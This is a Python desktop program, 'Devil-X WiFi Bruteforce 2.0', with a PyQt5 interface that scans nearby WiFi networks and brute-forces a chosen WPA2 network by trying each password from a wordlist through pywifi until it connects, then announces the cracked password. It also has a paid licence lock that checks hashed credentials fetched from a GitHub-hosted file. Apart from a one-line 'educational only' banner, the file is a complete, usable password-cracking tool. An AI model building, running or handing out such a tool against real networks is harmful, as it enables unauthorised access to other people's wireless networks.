"""
Devil-X WiFi Bruteforce 2.0 — Windows Desktop Cyber Tool
Developer: MD Shamim | Devil-X Studios
Requires: pip install PyQt5 pywifi
"""

import sys, os, time, threading, subprocess, hashlib, json, urllib.request
from datetime import datetime
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QPushButton, QListWidget, QListWidgetItem, QLineEdit,
    QTextEdit, QProgressBar, QFileDialog, QMessageBox, QDoubleSpinBox,
    QFrame, QSplitter, QGridLayout, QSizePolicy, QDialog
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QFont, QColor, QPalette, QIcon, QTextCursor

# ── Security & Remote License Verification ───────────────────────────────────
SALT_KEY = "DevilX@Shamim#Studio2026"
REMOTE_LICENSE_URL = "https://raw.githubusercontent.com/Anonymous-Cyber-Team/wifi-bruteforce/main/secret_vault/license.json"
LOCAL_LICENSE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "secret_vault", "license.json")
LICENSE_FILE = os.path.join(os.path.expanduser("~"), ".devil_x_activation.json")

def is_activated():
    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                expire_str = data.get("expire_date") or data.get("expire_at")
                if expire_str:
                    expire_dt = datetime.strptime(expire_str, "%Y-%m-%d %H:%M:%S")
                    if datetime.now() < expire_dt:
                        return True
        except Exception:
            return False
    return False

def set_activated(username, expire_at, plan="Pro"):
    try:
        with open(LICENSE_FILE, "w", encoding="utf-8") as f:
            json.dump({"username": username, "expire_date": expire_at, "plan": plan, "status": "active"}, f)
    except Exception:
        pass


# ── pywifi optional ──────────────────────────────────────────────────────────
try:
    import pywifi
    from pywifi import const
    PYWIFI_AVAILABLE = True
except Exception:
    PYWIFI_AVAILABLE = False

# ── Stylesheet ───────────────────────────────────────────────────────────────
STYLESHEET = """
QMainWindow, QWidget {
    background-color: #0d1117;
    color: #e6edf3;
    font-family: 'Segoe UI';
    font-size: 10pt;
}
QFrame#card {
    background-color: #161b22;
    border: 1px solid #30363d;
    border-radius: 8px;
}
QLabel#title {
    color: #58a6ff;
    font-size: 20pt;
    font-weight: bold;
}
QLabel#subtitle {
    color: #8b949e;
    font-size: 9pt;
}
QLabel#section {
    color: #e6edf3;
    font-size: 11pt;
    font-weight: bold;
}
QLabel#muted {
    color: #8b949e;
}
QLabel#stat-val {
    color: #58a6ff;
    font-size: 18pt;
    font-weight: bold;
}
QListWidget {
    background-color: #1c2128;
    border: 1px solid #30363d;
    border-radius: 6px;
    color: #e6edf3;
    font-family: 'Segoe UI';
    font-size: 10pt;
    padding: 4px;
    outline: none;
}
QListWidget::item:selected {
    background-color: #58a6ff;
    color: #0d1117;
    border-radius: 4px;
}
QListWidget::item:hover {
    background-color: #21262d;
    border-radius: 4px;
}
QLineEdit {
    background-color: #1c2128;
    border: 1px solid #30363d;
    border-radius: 6px;
    color: #e6edf3;
    padding: 6px 10px;
    font-family: 'Consolas';
    font-size: 9pt;
}
QLineEdit:focus {
    border: 1px solid #58a6ff;
}
QTextEdit {
    background-color: #0d1117;
    border: 1px solid #30363d;
    border-radius: 6px;
    color: #e6edf3;
    font-family: 'Consolas';
    font-size: 9pt;
    padding: 6px;
}
QPushButton {
    background-color: #21262d;
    color: #e6edf3;
    border: 1px solid #30363d;
    border-radius: 6px;
    padding: 8px 16px;
    font-size: 10pt;
}
QPushButton:hover {
    background-color: #30363d;
    border-color: #58a6ff;
}
QPushButton#btn-start {
    background-color: #238636;
    color: white;
    font-weight: bold;
    font-size: 11pt;
    border: none;
    padding: 10px;
    border-radius: 8px;
}
QPushButton#btn-start:hover { background-color: #2ea043; }
QPushButton#btn-start:disabled { background-color: #1a3a20; color: #666; }
QPushButton#btn-stop {
    background-color: #b91c1c;
    color: white;
    font-weight: bold;
    font-size: 11pt;
    border: none;
    padding: 10px;
    border-radius: 8px;
}
QPushButton#btn-stop:hover { background-color: #dc2626; }
QPushButton#btn-stop:disabled { background-color: #3a1a1a; color: #666; }
QPushButton#btn-scan {
    background-color: #1f4788;
    color: #58a6ff;
    border: 1px solid #2d5fa8;
    border-radius: 6px;
    padding: 7px;
    font-size: 10pt;
}
QPushButton#btn-scan:hover { background-color: #2d5fa8; }
QProgressBar {
    background-color: #1c2128;
    border: none;
    border-radius: 6px;
    text-align: center;
    color: #e6edf3;
    font-size: 9pt;
    height: 18px;
}
QProgressBar::chunk {
    background-color: #58a6ff;
    border-radius: 6px;
}
QDoubleSpinBox {
    background-color: #1c2128;
    border: 1px solid #30363d;
    border-radius: 6px;
    color: #e6edf3;
    padding: 5px;
}
QScrollBar:vertical {
    background: #0d1117;
    width: 8px;
    border-radius: 4px;
}
QScrollBar::handle:vertical {
    background: #30363d;
    border-radius: 4px;
    min-height: 20px;
}
QScrollBar::handle:vertical:hover { background: #58a6ff; }
QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height: 0; }
"""

# ── Worker Thread ─────────────────────────────────────────────────────────────
class AttackWorker(QThread):
    attempt_signal = pyqtSignal(int, int, str, float)
    found_signal   = pyqtSignal(str)
    done_signal    = pyqtSignal(bool, int)
    log_signal     = pyqtSignal(str, str)  # message, type

    def __init__(self, ssid, wordlist_path, delay):
        super().__init__()
        self.ssid = ssid
        self.wordlist_path = wordlist_path
        self.delay = delay
        self._stop = False

    def stop(self): self._stop = True

    def _try_connect(self, password):
        if not PYWIFI_AVAILABLE:
            return False
        try:
            wifi  = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            iface.disconnect()
            time.sleep(0.3)

            profile = pywifi.Profile()
            profile.ssid  = self.ssid
            profile.auth  = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key   = password

            iface.remove_all_network_profiles()
            tmp = iface.add_network_profile(profile)
            iface.connect(tmp)
            time.sleep(3)

            if iface.status() == const.IFACE_CONNECTED:
                return True
            iface.disconnect()
            return False
        except Exception:
            return False

    def run(self):
        start = time.time()
        try:
            with open(self.wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [l.strip() for l in f if l.strip()]
        except Exception as e:
            self.log_signal.emit(f"Error reading wordlist: {e}", "error")
            self.done_signal.emit(False, 0)
            return

        total = len(passwords)
        self.log_signal.emit(f"Loaded {total:,} passwords from wordlist.", "info")

        for idx, pw in enumerate(passwords):
            if self._stop:
                break
            elapsed = time.time() - start
            speed   = (idx + 1) / elapsed if elapsed > 0 else 0
            self.attempt_signal.emit(idx + 1, total, pw, speed)

            if self._try_connect(pw):
                self.found_signal.emit(pw)
                self.done_signal.emit(True, idx + 1)
                return

            time.sleep(self.delay)

        self.done_signal.emit(False, len(passwords))


# ── Scanner Thread ────────────────────────────────────────────────────────────
class ScanWorker(QThread):
    result_signal = pyqtSignal(list)

    def run(self):
        networks = []
        try:
            if PYWIFI_AVAILABLE:
                wifi  = pywifi.PyWiFi()
                iface = wifi.interfaces()[0]
                iface.scan()
                time.sleep(2)
                for net in iface.scan_results():
                    ssid = net.ssid.strip()
                    if ssid and ssid not in networks:
                        networks.append(ssid)
            else:
                result = subprocess.run(
                    ["netsh", "wlan", "show", "networks"],
                    capture_output=True, text=True, encoding="utf-8", errors="ignore"
                )
                for line in result.stdout.splitlines():
                    line = line.strip()
                    if line.startswith("SSID") and ":" in line and "BSSID" not in line:
                        ssid = line.split(":", 1)[1].strip()
                        if ssid and ssid not in networks:
                            networks.append(ssid)
        except Exception as e:
            networks = [f"Scan error: {e}"]
        self.result_signal.emit(networks if networks else ["No networks found"])


# ── Separator helper ─────────────────────────────────────────────────────────
def hline():
    f = QFrame()
    f.setFrameShape(QFrame.HLine)
    f.setStyleSheet("color: #30363d;")
    return f


# ── Main Window ───────────────────────────────────────────────────────────────
class WiFiBruteforcer(QMainWindow):
    def __init__(self):
        super().__init__()
        self.worker     = None
        self.scanner    = None
        self.start_time = None
        self.timer      = QTimer(self)
        self.timer.timeout.connect(self._tick_elapsed)
        self._setup_window()
        self._build_ui()
        self._load_default_wordlist()
        self._scan_networks()

    def _setup_window(self):
        self.setWindowTitle("Devil-X WiFi Bruteforce 2.0 — Cyber Suite")
        self.setMinimumSize(960, 700)
        self.resize(1060, 740)
        self.setStyleSheet(STYLESHEET)

    def _build_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        root = QVBoxLayout(central)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        # ── Header ──────────────────────────────────────────────────────────
        header = QWidget()
        header.setStyleSheet("background:#161b22; border-bottom:1px solid #30363d;")
        h_lay = QVBoxLayout(header)
        h_lay.setContentsMargins(24, 16, 24, 16)
        h_lay.setSpacing(4)

        title = QLabel("🔥  DEVIL-X WIFI BRUTEFORCE 2.0")
        title.setObjectName("title")
        sub   = QLabel("Pro Cyber Edition  •  Developer: MD Shamim | Devil-X Studios")
        sub.setObjectName("subtitle")
        h_lay.addWidget(title)
        h_lay.addWidget(sub)
        root.addWidget(header)


        # ── Warning ──────────────────────────────────────────────────────────
        warn = QLabel("⚠️  শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে | নিজের নেটওয়ার্কে পরীক্ষা করুন | Unauthorized access is illegal.")
        warn.setStyleSheet("background:#2d1a00; color:#e3b341; padding:6px 24px; font-size:9pt;")
        warn.setAlignment(Qt.AlignCenter)
        root.addWidget(warn)

        # ── Body ────────────────────────────────────────────────────────────
        body = QWidget()
        body_lay = QHBoxLayout(body)
        body_lay.setContentsMargins(16, 16, 16, 16)
        body_lay.setSpacing(14)
        root.addWidget(body, 1)

        # Left panel
        left = self._build_left()
        body_lay.addWidget(left, 0)

        # Right panel
        right = self._build_right()
        body_lay.addWidget(right, 1)

        # ── Status bar ───────────────────────────────────────────────────────
        sb = QWidget()
        sb.setStyleSheet("background:#161b22; border-top:1px solid #30363d;")
        sb_lay = QHBoxLayout(sb)
        sb_lay.setContentsMargins(16, 6, 16, 6)

        self.status_lbl = QLabel("● Ready")
        self.status_lbl.setStyleSheet("color:#8b949e; font-size:9pt;")

        mode_txt = "pywifi: ✓ Active" if PYWIFI_AVAILABLE else "pywifi: ✗ Demo Mode"
        mode_color = "#3fb950" if PYWIFI_AVAILABLE else "#e3b341"
        mode_lbl = QLabel(mode_txt)
        mode_lbl.setStyleSheet(f"color:{mode_color}; font-size:9pt;")

        sb_lay.addWidget(self.status_lbl)
        sb_lay.addStretch()
        dev_toast = QLabel("⚡ Devil-X Studios | MD Shamim ⚡")
        dev_toast.setStyleSheet("color:#00e5ff; font-weight:bold; font-size:9pt; background:#1c2128; border:1px solid #00e5ff44; border-radius:10px; padding:3px 14px;")

        sb_lay.addWidget(dev_toast)
        sb_lay.addStretch()
        sb_lay.addWidget(mode_lbl)
        root.addWidget(sb)

    # ── Left panel ───────────────────────────────────────────────────────────
    def _build_left(self):
        w   = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(12)
        w.setFixedWidth(320)

        # Network card
        net = self._card()
        n_l = QVBoxLayout(net)
        n_l.setSpacing(8)

        lbl = QLabel("🌐  WiFi Networks")
        lbl.setObjectName("section")
        n_l.addWidget(lbl)
        n_l.addWidget(hline())

        self.net_list = QListWidget()
        self.net_list.setMinimumHeight(150)
        self.net_list.itemClicked.connect(self._on_net_select)
        n_l.addWidget(self.net_list)

        self.scan_btn = QPushButton("🔍  Scan Networks")
        self.scan_btn.setObjectName("btn-scan")
        self.scan_btn.clicked.connect(self._scan_networks)
        n_l.addWidget(self.scan_btn)

        lay.addWidget(net)

        # Wordlist card
        wl  = self._card()
        w_l = QVBoxLayout(wl)
        w_l.setSpacing(8)

        wl_lbl = QLabel("📋  Wordlist / Password File")
        wl_lbl.setObjectName("section")
        w_l.addWidget(wl_lbl)
        w_l.addWidget(hline())

        self.wl_path = QLineEdit()
        self.wl_path.setPlaceholderText("Path to wordlist (.txt)…")
        w_l.addWidget(self.wl_path)

        browse = QPushButton("📁  Browse Wordlist")
        browse.clicked.connect(self._browse_wordlist)
        w_l.addWidget(browse)

        self.wl_stats = QLabel("")
        self.wl_stats.setObjectName("muted")
        self.wl_stats.setStyleSheet("color:#8b949e; font-size:9pt;")
        w_l.addWidget(self.wl_stats)

        lay.addWidget(wl)

        # Settings card
        sc  = self._card()
        s_l = QVBoxLayout(sc)
        s_l.setSpacing(8)

        s_lbl = QLabel("⚙️  Settings")
        s_lbl.setObjectName("section")
        s_l.addWidget(s_lbl)
        s_l.addWidget(hline())

        delay_row = QHBoxLayout()
        delay_row.addWidget(QLabel("Delay (seconds):"))
        self.delay_spin = QDoubleSpinBox()
        self.delay_spin.setRange(0.0, 10.0)
        self.delay_spin.setSingleStep(0.1)
        self.delay_spin.setValue(0.5)
        self.delay_spin.setDecimals(1)
        self.delay_spin.setFixedWidth(80)
        delay_row.addStretch()
        delay_row.addWidget(self.delay_spin)
        s_l.addLayout(delay_row)

        lay.addWidget(sc)

        # Buttons
        self.start_btn = QPushButton("▶  START ATTACK")
        self.start_btn.setObjectName("btn-start")
        self.start_btn.clicked.connect(self._start_attack)
        lay.addWidget(self.start_btn)

        self.stop_btn = QPushButton("⏹  STOP")
        self.stop_btn.setObjectName("btn-stop")
        self.stop_btn.setEnabled(False)
        self.stop_btn.clicked.connect(self._stop_attack)
        lay.addWidget(self.stop_btn)

        lay.addStretch()
        return w

    # ── Right panel ──────────────────────────────────────────────────────────
    def _build_right(self):
        w   = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(12)

        # Progress card
        pc  = self._card()
        p_l = QVBoxLayout(pc)
        p_l.setSpacing(8)

        prog_lbl = QLabel("📊  Attack Progress")
        prog_lbl.setObjectName("section")
        p_l.addWidget(prog_lbl)
        p_l.addWidget(hline())

        # Stats grid
        stats = QGridLayout()
        stats.setSpacing(8)

        self.stat_attempt = self._stat_box("Attempts",  "0")
        self.stat_total   = self._stat_box("Total",     "0")
        self.stat_speed   = self._stat_box("Speed",     "0/s")
        self.stat_elapsed = self._stat_box("Elapsed",   "00:00")

        stats.addWidget(self.stat_attempt[0], 0, 0)
        stats.addWidget(self.stat_total[0],   0, 1)
        stats.addWidget(self.stat_speed[0],   0, 2)
        stats.addWidget(self.stat_elapsed[0], 0, 3)
        p_l.addLayout(stats)

        self.progress = QProgressBar()
        self.progress.setRange(0, 100)
        self.progress.setValue(0)
        self.progress.setFixedHeight(18)
        p_l.addWidget(self.progress)

        self.prog_text = QLabel("Ready…")
        self.prog_text.setObjectName("muted")
        self.prog_text.setStyleSheet("color:#8b949e;")
        p_l.addWidget(self.prog_text)

        lay.addWidget(pc)

        # Current password
        cur  = self._card()
        c_l  = QHBoxLayout(cur)
        c_l.setContentsMargins(14, 10, 14, 10)
        key_lbl = QLabel("🔑  Trying:")
        key_lbl.setObjectName("muted")
        key_lbl.setStyleSheet("color:#8b949e;")
        self.cur_pw = QLabel("—")
        self.cur_pw.setStyleSheet("color:#58a6ff; font-family:Consolas; font-size:12pt; font-weight:bold;")
        c_l.addWidget(key_lbl)
        c_l.addWidget(self.cur_pw, 1)
        lay.addWidget(cur)

        # Log card
        lc  = self._card()
        l_l = QVBoxLayout(lc)
        l_l.setSpacing(6)

        log_hdr = QHBoxLayout()
        log_t   = QLabel("📝  Live Log")
        log_t.setObjectName("section")
        clear_btn = QPushButton("Clear")
        clear_btn.setFixedSize(60, 26)
        clear_btn.clicked.connect(lambda: self.log_view.clear())
        log_hdr.addWidget(log_t)
        log_hdr.addStretch()
        log_hdr.addWidget(clear_btn)
        l_l.addLayout(log_hdr)
        l_l.addWidget(hline())

        self.log_view = QTextEdit()
        self.log_view.setReadOnly(True)
        l_l.addWidget(self.log_view, 1)

        lay.addWidget(lc, 1)
        return w

    # ── Helpers ──────────────────────────────────────────────────────────────
    def _card(self):
        f = QFrame()
        f.setObjectName("card")
        f.setStyleSheet("""
            QFrame#card {
                background-color: #161b22;
                border: 1px solid #30363d;
                border-radius: 8px;
                padding: 6px;
            }
        """)
        return f

    def _stat_box(self, label, default):
        box = QFrame()
        box.setStyleSheet("""
            QFrame {
                background:#1c2128;
                border:1px solid #30363d;
                border-radius:6px;
            }
        """)
        blay = QVBoxLayout(box)
        blay.setContentsMargins(10, 8, 10, 8)
        blay.setSpacing(2)
        val = QLabel(default)
        val.setObjectName("stat-val")
        val.setAlignment(Qt.AlignCenter)
        lbl = QLabel(label)
        lbl.setObjectName("muted")
        lbl.setStyleSheet("color:#8b949e; font-size:9pt;")
        lbl.setAlignment(Qt.AlignCenter)
        blay.addWidget(val)
        blay.addWidget(lbl)
        return box, val

    def _log(self, msg, kind="normal"):
        colors = {
            "success": "#3fb950",
            "error":   "#f85149",
            "info":    "#58a6ff",
            "normal":  "#e6edf3",
            "muted":   "#8b949e",
        }
        color = colors.get(kind, "#e6edf3")
        ts    = time.strftime("%H:%M:%S")
        html  = f'<span style="color:#8b949e;">[{ts}]</span> <span style="color:{color};">{msg}</span><br>'
        self.log_view.moveCursor(QTextCursor.End)
        self.log_view.insertHtml(html)
        self.log_view.moveCursor(QTextCursor.End)

    def _set_status(self, txt, color="#8b949e"):
        self.status_lbl.setText(f"● {txt}")
        self.status_lbl.setStyleSheet(f"color:{color}; font-size:9pt;")

    # ── Scan ────────────────────────────────────────────────────────────────
    def _scan_networks(self):
        self.net_list.clear()
        self.net_list.addItem("Scanning…")
        self.scan_btn.setEnabled(False)
        self._set_status("Scanning networks…", "#58a6ff")

        self.scanner = ScanWorker()
        self.scanner.result_signal.connect(self._on_scan_done)
        self.scanner.start()

    def _on_scan_done(self, networks):
        self.net_list.clear()
        for n in networks:
            item = QListWidgetItem(f"  📶  {n}")
            self.net_list.addItem(item)
        self.scan_btn.setEnabled(True)
        self._set_status(f"Found {len(networks)} network(s)", "#3fb950")
        self._log(f"Scan complete — {len(networks)} network(s) found.", "info")

    def _on_net_select(self, item):
        ssid = item.text().strip().replace("📶  ", "").strip()
        self._set_status(f"Selected: {ssid}", "#58a6ff")

    def _selected_ssid(self):
        items = self.net_list.selectedItems()
        if not items:
            return ""
        return items[0].text().strip().replace("📶  ", "").strip()

    # ── Wordlist ─────────────────────────────────────────────────────────────
    def _browse_wordlist(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "Select Wordlist", "", "Text Files (*.txt);;All Files (*)"
        )
        if path:
            self.wl_path.setText(path)
            self._update_wl_stats(path)

    def _load_default_wordlist(self):
        default = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            "sourcecode", "main", "assets", "passwords.txt"
        )
        if os.path.exists(default):
            self.wl_path.setText(default)
            self._update_wl_stats(default)

    def _update_wl_stats(self, path):
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                count = sum(1 for l in f if l.strip())
            size = os.path.getsize(path) // 1024
            self.wl_stats.setText(f"  {count:,} passwords  •  {size} KB")
            self.wl_stats.setStyleSheet("color:#3fb950; font-size:9pt;")
        except Exception:
            self.wl_stats.setText("  Cannot read file")
            self.wl_stats.setStyleSheet("color:#f85149; font-size:9pt;")

    # ── Attack ───────────────────────────────────────────────────────────────
    def _start_attack(self):
        ssid = self._selected_ssid()
        if not ssid:
            QMessageBox.warning(self, "No Target", "Please select a WiFi network first!")
            return

        wl = self.wl_path.text().strip()
        if not os.path.exists(wl):
            QMessageBox.warning(self, "No Wordlist", f"Wordlist file not found:\n{wl}")
            return

        delay = self.delay_spin.value()

        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.progress.setValue(0)
        self.start_time = time.time()
        self.timer.start(1000)
        self._set_status(f"Attacking: {ssid}", "#f85149")
        self._log(f"Starting attack on: <b>{ssid}</b>", "info")

        if not PYWIFI_AVAILABLE:
            self._log("⚠ DEMO MODE — pywifi not available. Simulating only.", "error")

        self.worker = AttackWorker(ssid, wl, delay)
        self.worker.attempt_signal.connect(self._on_attempt)
        self.worker.found_signal.connect(self._on_found)
        self.worker.done_signal.connect(self._on_done)
        self.worker.log_signal.connect(self._log)
        self.worker.start()

    def _stop_attack(self):
        if self.worker:
            self.worker.stop()
        self.timer.stop()
        self._set_status("Stopped by user", "#e3b341")
        self._log("Attack stopped by user.", "error")

    def _tick_elapsed(self):
        if self.start_time:
            elapsed = int(time.time() - self.start_time)
            m, s = divmod(elapsed, 60)
            self.stat_elapsed[1].setText(f"{m:02d}:{s:02d}")

    def _on_attempt(self, current, total, pw, speed):
        pct = int(current / total * 100) if total else 0
        self.progress.setValue(pct)
        self.prog_text.setText(f"{current:,} / {total:,}  ({pct}%)")
        self.stat_attempt[1].setText(f"{current:,}")
        self.stat_total[1].setText(f"{total:,}")
        self.stat_speed[1].setText(f"{speed:.1f}/s")
        self.cur_pw.setText(pw)

        if current % 100 == 0 or current == 1:
            self._log(f"[{current}/{total}] Trying: <span style='color:#58a6ff;font-family:Consolas;'>{pw}</span>  •  {speed:.1f} pw/s", "muted")

    def _on_found(self, password):
        self.cur_pw.setStyleSheet("color:#3fb950; font-family:Consolas; font-size:12pt; font-weight:bold;")
        self.cur_pw.setText(password)
        self._log(f"✅ PASSWORD FOUND: <b style='color:#3fb950;'>{password}</b>", "success")
        self._set_status(f"✅ Found: {password}", "#3fb950")
        QMessageBox.information(
            self, "🎉 Password Found!",
            f"WiFi Password Cracked!\n\n"
            f"Network:  {self._selected_ssid()}\n"
            f"Password: {password}\n\n"
            f"Attempts: {self.stat_attempt[1].text()}"
        )

    def _on_done(self, success, count):
        self.timer.stop()
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)

        if not success:
            self._log("❌ Password not found in wordlist. Try a larger wordlist.", "error")
            self._set_status("Not found — try larger wordlist", "#f85149")


# ── Security Lock Dialog ──────────────────────────────────────────────────────
class LockDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("🔐 Software Activation Lock")
        self.setFixedSize(450, 280)
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setStyleSheet("""
            QDialog {
                background-color: #0d1117;
                color: #e6edf3;
                font-family: 'Segoe UI', Arial, sans-serif;
            }
            QLineEdit {
                background-color: #161b22;
                border: 1px solid #30363d;
                border-radius: 6px;
                padding: 10px 14px;
                color: #e6edf3;
                font-size: 11pt;
            }
            QLineEdit:focus {
                border: 1px solid #58a6ff;
            }
            QPushButton#verify-btn {
                background-color: #238636;
                color: #ffffff;
                font-weight: bold;
                font-size: 11pt;
                padding: 10px;
                border-radius: 6px;
                border: none;
            }
            QPushButton#verify-btn:hover {
                background-color: #2ea043;
            }
        """)

        layout = QVBoxLayout(self)
        layout.setContentsMargins(28, 22, 28, 18)
        layout.setSpacing(12)

        # Title
        t = QLabel("🔥 DEVIL-X ACTIVATION LOCK")
        t.setStyleSheet("color:#00e5ff; font-size:14pt; font-weight:bold; letter-spacing:1px;")
        t.setAlignment(Qt.AlignCenter)
        layout.addWidget(t)

        sub = QLabel("অনলাইন লাইসেন্স যাচাই করতে ইউজারনেম ও পাসওয়ার্ড দিন:")
        sub.setStyleSheet("color:#8b949e; font-size:9.5pt;")
        sub.setAlignment(Qt.AlignCenter)
        layout.addWidget(sub)

        # Username Input
        self.user_input = QLineEdit()
        self.user_input.setPlaceholderText("ইউজারনেম লিখুন (যেমন: shamim_admin)...")
        layout.addWidget(self.user_input)

        # Password Input
        self.pw_input = QLineEdit()
        self.pw_input.setEchoMode(QLineEdit.Password)
        self.pw_input.setPlaceholderText("পাসওয়ার্ড লিখুন...")
        self.pw_input.returnPressed.connect(self._verify)
        layout.addWidget(self.pw_input)

        # Error label
        self.err_lbl = QLabel("")
        self.err_lbl.setStyleSheet("color:#f85149; font-size:9pt;")
        self.err_lbl.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.err_lbl)

        # Verify button
        self.btn = QPushButton("ভেরিফাই / আনলক করুন")
        self.btn.setObjectName("verify-btn")
        self.btn.setCursor(Qt.PointingHandCursor)
        self.btn.clicked.connect(self._verify)
        layout.addWidget(self.btn)

        layout.addStretch()

        # Toast notification at bottom
        toast = QLabel("⚡ Powered by Devil-X Studios | MD Shamim ⚡")
        toast.setStyleSheet("""
            background-color: #1c2128;
            color: #00e5ff;
            border: 1px solid #00e5ff44;
            border-radius: 12px;
            padding: 6px 14px;
            font-size: 9pt;
            font-weight: bold;
        """)
        toast.setAlignment(Qt.AlignCenter)
        layout.addWidget(toast)

    def _verify(self):
        user = self.user_input.text().strip()
        pw   = self.pw_input.text().strip()
        if not user:
            self.err_lbl.setText("অনুগ্রহ করে ইউজারনেম দিন!")
            return
        if not pw:
            self.err_lbl.setText("অনুগ্রহ করে পাসওয়ার্ড দিন!")
            return

        self.err_lbl.setStyleSheet("color:#00e5ff; font-size:9pt;")
        self.err_lbl.setText("লাইসেন্স যাচাই করা হচ্ছে...")
        QApplication.processEvents()

        data = None
        # 1. Try remote license URL
        try:
            req = urllib.request.Request(
                REMOTE_LICENSE_URL,
                headers={"User-Agent": "Mozilla/5.0"}
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read().decode("utf-8"))
        except Exception:
            # 2. Fallback to local secret_vault/license.json
            if os.path.exists(LOCAL_LICENSE_PATH):
                try:
                    with open(LOCAL_LICENSE_PATH, "r", encoding="utf-8") as f:
                        data = json.load(f)
                except Exception:
                    pass

        if not data:
            self.err_lbl.setStyleSheet("color:#f85149; font-size:9pt;")
            self.err_lbl.setText("❌ লাইসেন্স সার্ভার বা লোকাল ফাইলে সংযোগ করা যায়নি!")
            return

        try:
            users = data.get("users", {})
            if user not in users:
                self.err_lbl.setStyleSheet("color:#f85149; font-size:9pt;")
                self.err_lbl.setText("❌ ইউজারনেম পাওয়া যায়নি!")
                return

            user_data = users[user]
            display_name = user_data.get("username", user)
            expected_hash = user_data.get("password_hash", "")
            status = user_data.get("status", "active")
            expire_str = user_data.get("expire_date") or user_data.get("expire_at", "")
            plan = user_data.get("plan", "Pro")

            if status != "active":
                self.err_lbl.setStyleSheet("color:#f85149; font-size:9pt;")
                self.err_lbl.setText("❌ এই ইউজারের এক্সেস স্থগিত (Blocked) করা আছে!")
                return

            input_hash = hashlib.sha256((pw + SALT_KEY).encode("utf-8")).hexdigest().lower()
            if input_hash != expected_hash.lower():
                self.err_lbl.setStyleSheet("color:#f85149; font-size:9pt;")
                self.err_lbl.setText("❌ ভুল পাসওয়ার্ড! সঠিক পাসওয়ার্ড দিন।")
                self.pw_input.clear()
                self.pw_input.setFocus()
                return

            # Check expiry
            if expire_str:
                expire_dt = datetime.strptime(expire_str, "%Y-%m-%d %H:%M:%S")
                if datetime.now() > expire_dt:
                    self.err_lbl.setStyleSheet("color:#f85149; font-size:9pt;")
                    self.err_lbl.setText(f"❌ মেয়াদ শেষ ({expire_str})! রিনিউ করুন।")
                    return

            set_activated(user, expire_str, plan)
            QMessageBox.information(
                self, "সফল",
                f"✅ Devil-X সফলভাবে আনলক হয়েছে!\nস্বাগতম: {display_name}\nপ্যাকেজ: {plan}\nমেয়াদ: {expire_str}"
            )
            self.accept()

        except Exception as e:
            self.err_lbl.setStyleSheet("color:#f85149; font-size:9pt;")
            self.err_lbl.setText(f"⚠️ যাচাইকরণ ত্রুটি: {e}")



# ── Entry point ───────────────────────────────────────────────────────────────
def main():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")

    if not is_activated():
        dlg = LockDialog()
        if dlg.exec_() != QDialog.Accepted:
            sys.exit(0)

    win = WiFiBruteforcer()
    win.show()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()
